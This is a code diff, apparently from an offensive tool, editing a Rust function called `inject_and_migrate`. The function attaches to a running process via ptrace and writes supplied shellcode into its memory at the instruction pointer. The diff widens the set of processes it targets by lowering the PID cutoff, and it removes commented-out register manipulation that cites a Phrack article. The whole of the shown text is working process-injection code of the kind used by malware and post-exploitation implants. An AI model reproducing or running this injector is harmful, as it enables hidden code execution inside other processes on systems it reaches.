@@ -17,7 +17,7 @@ pub fn inject_and_migrate(shellcode: &[u8]) {
                                                         .split('\n')
                                                         .flat_map(|s| s.parse().ok())
                                                         .collect();
-    pids.retain(|i| *i > 100 && *i != process::id() as i32);
+    pids.retain(|i| *i > 10 && *i != process::id() as i32);
     for pid in pids.iter().rev() {
         if attach(Pid::from_raw(*pid)).is_ok() {
             target_pid = *pid;
@@ -38,13 +38,6 @@ pub fn inject_and_migrate(shellcode: &[u8]) {
         Ok(value) => value
     };
 
-    // Modify registers similar to how http://phrack.org/issues/59/12.html did
-    //registers.rsp -= 4;
-    //if let Err(error) = unsafe { write(target_pid, registers.rsp as *mut c_void, registers.rip as *mut c_void) }{
-    //    panic!("Unable to write RIP to RSP in target process: {}", error);
-    //}
-    //let mut point = registers.rsp - 1024;
-    //registers.rip = registers.rsp - 1022;
     let mut point = registers.rip;
     registers.rip += 2;
     
@@ -52,7 +45,7 @@ pub fn inject_and_migrate(shellcode: &[u8]) {
         panic!("Unable to reset target process registers: {}", error);
     }
 
-    // Write shellcode to target process one WORD at a time
+    // Write shellcode to target process one byte at a time
     for byte in shellcode {
         if let Err(error) = unsafe { write(target_pid, point as *mut c_void, *byte as *mut c_void) } {
             panic!("Unable to write portion of shellcode at {} to target process: {}", byte, error);
